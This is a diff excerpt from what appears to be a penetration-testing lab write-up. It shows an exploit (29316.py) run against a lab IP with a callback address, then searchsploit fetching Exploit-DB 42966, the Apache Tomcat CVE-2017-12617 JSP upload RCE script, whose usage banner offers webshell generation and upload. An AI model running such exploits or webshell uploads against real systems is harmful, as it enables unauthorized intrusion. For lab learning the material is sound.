@@ -43,7 +43,48 @@ hippoeug@kali:~$ python 29316.py -h 10.129.29.200 -s -x 10.10.14.19:4444
 [+] h0p3 1t h3lp3d
 hippoeug@kali:~$ 
 
+hippoeug@kali:~$ searchsploit -m 42966.py
+  Exploit: Apache Tomcat < 9.0.1 (Beta) / < 8.5.23 / < 8.0.47 / < 7.0.8 - JSP Upload Bypass / Remote Code Execution (2)
+      URL: https://www.exploit-db.com/exploits/42966
+     Path: /usr/share/exploitdb/exploits/jsp/webapps/42966.py
+File Type: Python script, ASCII text executable, with CRLF line terminators
 
+Copied to: /home/hippoeug/42966.py
+
+
+hippoeug@kali:~$ python 42966.py
+
+                                                                                                                                                                      
+                                                                                                                                                                      
+   _______      ________    ___   ___  __ ______     __ ___   __ __ ______                                                                                            
+  / ____\ \    / /  ____|  |__ \ / _ \/_ |____  |   /_ |__ \ / //_ |____  |                                                                                           
+ | |     \ \  / /| |__ ______ ) | | | || |   / /_____| |  ) / /_ | |   / /                                                                                            
+ | |      \ \/ / |  __|______/ /| | | || |  / /______| | / / '_ \| |  / /                                                                                             
+ | |____   \  /  | |____    / /_| |_| || | / /       | |/ /| (_) | | / /                                                                                              
+  \_____|   \/   |______|  |____|\___/ |_|/_/        |_|____\___/|_|/_/                                                                                               
+                                                                                                                                                                      
+                                                                                                                                                                      
+                                                                                                                                                                      
+                                                                                                                                                                      
+./cve-2017-12617.py [options]                                                                                                                                         
+                                                                                                                                                                      
+options:                                                                                                                                                              
+                                                                                                                                                                      
+-u ,--url [::] check target url if it's vulnerable                                                                                                                    
+-p,--pwn  [::] generate webshell and upload it                                                                                                                        
+-l,--list [::] hosts list                                                                                                                                             
+                                                                                                                                                                      
+[+]usage:                                                                                                                                                             
+                                                                                                                                                                      
+./cve-2017-12617.py -u http://127.0.0.1                                                                                                                               
+./cve-2017-12617.py --url http://127.0.0.1                                                                                                                            
+./cve-2017-12617.py -u http://127.0.0.1 -p pwn                                                                                                                        
+./cve-2017-12617.py --url http://127.0.0.1 -pwn pwn                                                                                                                   
+./cve-2017-12617.py -l hotsts.txt                                                                                                                                     
+./cve-2017-12617.py --list hosts.txt                                                                                                                                  
+                                                                                                                                                                      
+                                                                                                                                                                      
+[@intx0x80]                            
 
 
 
